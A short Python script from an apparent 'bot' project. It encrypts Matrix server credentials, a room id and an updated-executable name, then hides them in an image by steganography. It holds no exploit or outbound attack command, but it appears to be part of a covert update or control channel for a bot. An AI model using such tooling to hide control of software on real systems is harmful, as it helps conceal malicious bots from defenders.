from bot.tools.steganography import hide
from bot.tools.encryption import encrypt_dictionary
import argparse

DEFAULT_MATRIX_SERVER = "https://matrix.org"


def hide_updates_info():
    parser = argparse.ArgumentParser(description='Hide information in the image')

    parser.add_argument("input_image",
                        type=str,
                        help="Image to hide information")
    parser.add_argument("--matrix_server", "-ms", dest="matrix_server",
                        type=str, required=False, default=DEFAULT_MATRIX_SERVER,
                        help="Matrix server HTTP URL")
    parser.add_argument("--matrix_user", "-mu",
                        type=str, required=True,
                        help="Matrix username")
    parser.add_argument("--matrix_pwd", "-mp",
                        type=str, required=True,
                        help="Matrix password")
    parser.add_argument("--matrix_room", "-mr",
                        type=str, required=True,
                        help="Matrix room id")
    parser.add_argument("--updated_executable", "-ue",
                        type=str, required=False,
                        help="Updated executable file name")
    args: argparse.Namespace = parser.parse_args()
    update_configuration: dict = {
        'matrix_server': args.matrix_server,
        'matrix_user': args.matrix_user,
        'matrix_pwd': args.matrix_pwd,
        'matrix_room': args.matrix_room,
        'updated_executable': args.updated_executable
    }
    input_image = args.input_image
    output_image = 'img.png'
    encrypted_configuration: str = encrypt_dictionary(update_configuration)
    hide(encrypted_configuration, input_image, output_image)
    print("Update configuration hidden in " + output_image)


if __name__ == '__main__':
    hide_updates_info()
